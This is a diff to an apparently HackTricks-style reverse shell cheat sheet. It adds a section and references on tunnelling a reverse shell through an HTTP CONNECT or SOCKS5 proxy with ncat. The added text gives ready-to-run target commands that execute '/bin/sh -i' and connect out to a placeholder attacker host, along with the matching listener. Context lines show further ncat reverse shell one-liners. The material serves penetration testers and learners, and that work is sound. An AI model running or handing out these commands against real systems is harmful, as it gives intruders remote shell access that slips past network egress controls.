@@ -217,6 +217,23 @@ victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
 attacker> ncat -l <port,eg.443> --ssl
 ```
 
+### Through an explicit outbound proxy
+
+If the target can reach an HTTP `CONNECT` or SOCKS proxy but cannot open a direct TCP connection to the listener, use **Ncat** in connect mode. The proxy must allow a tunnel to the listener's host and port; `CONNECT` only forwards bytes after setup, so a plain shell is **not** HTTP traffic or encrypted merely because it uses an HTTP proxy.<sup>[[20]](#references)[[21]](#references)[[22]](#references)</sup>
+
+```bash
+# Attacker: expose a listener reachable from the proxy
+ncat -l 443
+
+# Target: HTTP CONNECT proxy (default proxy type)
+ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type http --exec "/bin/sh -i" <ATTACKER_HOST> 443
+
+# Target: use this instead for a SOCKS5 proxy
+ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type socks5 --exec "/bin/sh -i" <ATTACKER_HOST> 443
+```
+
+For an authenticated proxy, Ncat accepts `--proxy-auth` or `NCAT_PROXY_AUTH` (the latter avoids putting credentials in command arguments).<sup>[[23]](#references)</sup> Destination hostnames are resolved by the proxy by default; use `--proxy-dns local` only when local resolution is required.<sup>[[23]](#references)</sup> If the proxy enforces TLS or application protocols beyond `CONNECT`, use an appropriate encrypted transport rather than assuming that port 443 disguises a raw shell; see [tunneling and port forwarding](../tunneling-and-port-forwarding.md) for WebSocket-based transport.<sup>[[22]](#references)[[24]](#references)</sup>
+
 ## Golang
 
 ```bash
@@ -486,5 +503,10 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
 - [18] [Pure Groovy/Java Reverse Shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
 - [19] [BusyBox](https://busybox.net/about.html)
+- [20] [Ncat Proxying](https://nmap.org/ncat/guide/ncat-proxy.html)
+- [21] [Ncat Command Execution](https://nmap.org/ncat/guide/ncat-exec.html)
+- [22] [RFC 9110: CONNECT](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.6)
+- [23] [Ncat Reference Guide](https://nmap.org/book/ncat-man.html)
+- [24] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
 
 {{#include ../../banners/hacktricks-training.md}}
